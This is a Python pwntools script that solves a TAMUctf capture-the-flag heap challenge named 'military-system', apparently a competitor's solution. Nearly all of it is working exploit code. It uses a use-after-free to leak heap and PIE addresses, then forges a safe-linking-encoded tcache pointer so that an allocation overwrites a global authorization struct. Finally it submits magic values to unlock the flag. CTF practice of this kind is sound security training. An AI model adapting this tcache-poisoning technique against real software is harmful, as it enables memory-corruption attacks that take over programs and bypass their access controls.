#!/usr/bin/env python3

import os
import re
from pathlib import Path

os.environ.setdefault("TERM", "xterm")

from pwn import *


PROJECT_ROOT = Path(__file__).resolve().parents[1]
DEFAULT_BINARY = PROJECT_ROOT / "military-system"

AUTH_MAGIC = 0x434F4D44
CLEARANCE_MAGIC = 7
FLAG_RE = re.compile(r"gigem\{[^}]+\}")


def load_binary():
    binary_path = Path(args.BIN) if args.BIN else DEFAULT_BINARY
    elf = ELF(str(binary_path), checksec=False)
    log.info("using binary %s (%s)", binary_path, elf.arch)
    return elf


ELF_FILE = load_binary()
context.binary = ELF_FILE
context.log_level = args.LOG_LEVEL or "info"


def start():
    if args.LOCAL:
        if args.HOST or args.PORT or args.TCP:
            host = args.HOST or "127.0.0.1"
            port = int(args.PORT or 9001)
            log.info("connecting to local TCP service on %s:%d", host, port)
            return remote(host, port)

        if not Path("/flag.txt").exists():
            log.warning("local process mode expects /flag.txt to exist; otherwise transmit_report will fail")

        log.info("spawning local process %s", ELF_FILE.path)
        return process([ELF_FILE.path])

    host = args.HOST or "streams.tamuctf.com"
    port = int(args.PORT or 443)
    sni = args.SNI or "military-system"
    return remote(host, port, ssl=True, sni=sni)


def choose(io, choice):
    io.recvuntil(b"> ")
    io.sendline(str(choice).encode())


def send_slot(io, slot):
    io.recvuntil(b"Slot: ")
    io.sendline(str(slot).encode())


def open_channel(io, slot, label):
    choose(io, 1)
    send_slot(io, slot)
    io.recvuntil(b"Callsign: ")
    io.sendline(label)


def queue_message(io, slot, payload):
    choose(io, 2)
    send_slot(io, slot)
    io.recvuntil(b"Draft bytes (64-128): ")
    io.sendline(str(len(payload)).encode())
    io.recvuntil(b"): ")
    io.send(payload)


def edit_draft(io, slot, span, payload):
    choose(io, 3)
    send_slot(io, slot)
    io.recvuntil(b"Editor span: ")
    io.sendline(str(span).encode())
    io.recvuntil(b"): ")
    io.send(payload)


def close_channel(io, slot):
    choose(io, 4)
    send_slot(io, slot)


def leak_state(io, slot):
    choose(io, 5)
    send_slot(io, slot)

    io.recvuntil(b"[STATUS] last_draft=")
    last_draft = int(io.recvline().strip(), 16)
    io.recvuntil(b"[STATUS] diagnostic_hook=")
    diagnostic_hook = int(io.recvline().strip(), 16)

    log.info("last_draft = %#x", last_draft)
    log.info("diagnostic_hook = %#x", diagnostic_hook)
    return last_draft, diagnostic_hook


def transmit_report(io, slot):
    choose(io, 6)
    send_slot(io, slot)
    return io.recvrepeat(1)


def resolve_offsets():
    render_status_off = int(args.RENDER_STATUS_OFF, 0) if args.RENDER_STATUS_OFF else ELF_FILE.sym["render_status"]
    g_auth_off = int(args.G_AUTH_OFF, 0) if args.G_AUTH_OFF else ELF_FILE.sym["g_auth"]

    log.info("render_status offset = %#x", render_status_off)
    log.info("g_auth offset = %#x", g_auth_off)
    return render_status_off, g_auth_off


def resolve_pie_base(diagnostic_hook, render_status_off):
    pie_base = diagnostic_hook - render_status_off

    if pie_base & 0xFFF == 0:
        return pie_base

    page_down = pie_base & ~0xFFF
    page_up = page_down + 0x1000
    candidates = []

    for candidate in (page_down, page_up):
        implied_offset = diagnostic_hook - candidate

        if implied_offset >= 0x1000:
            candidates.append((abs(implied_offset - render_status_off), candidate, implied_offset))

    if not candidates:
        log.warning("unable to normalize non-page-aligned PIE base %#x", pie_base)
        return pie_base

    _, candidate, implied_offset = min(candidates)
    log.warning(
        "normalized PIE base from %#x to %#x (implied render_status offset %#x)",
        pie_base,
        candidate,
        implied_offset,
    )
    return candidate


def build_auth_payload():
    return (
        b"A" * 32
        + p32(AUTH_MAGIC)
        + p32(CLEARANCE_MAGIC)
        + b"M" * 16
        + b"Z" * 72
    )


def exploit(io):
    render_status_off, g_auth_off = resolve_offsets()

    open_channel(io, 0, b"ALPHA")
    queue_message(io, 0, b"B" * 0x80)

    open_channel(io, 1, b"BRAVO")
    queue_message(io, 1, b"C" * 0x80)

    close_channel(io, 1)
    close_channel(io, 0)

    last_draft, diagnostic_hook = leak_state(io, 0)
    pie_base = resolve_pie_base(diagnostic_hook, render_status_off)
    g_auth = pie_base + g_auth_off
    poisoned_next = g_auth ^ (last_draft >> 12)

    log.info("pie base = %#x", pie_base)
    log.info("g_auth = %#x", g_auth)
    log.info("poisoned next = %#x", poisoned_next)

    poison_payload = p64(poisoned_next) + b"P" * (256 - 8)
    edit_draft(io, 0, 256, poison_payload)

    open_channel(io, 1, b"RESYNC")
    queue_message(io, 1, b"D" * 0x80)

    open_channel(io, 0, b"ADMIN")
    queue_message(io, 0, build_auth_payload())

    data = transmit_report(io, 0)
    text = data.decode("latin-1", errors="ignore")
    match = FLAG_RE.search(text)

    if not match:
        log.failure("flag not found in output")
        print(text)
        raise SystemExit(1)

    print(match.group(0))


def main():
    io = start()
    try:
        exploit(io)
    finally:
        io.close()


if __name__ == "__main__":
    main()
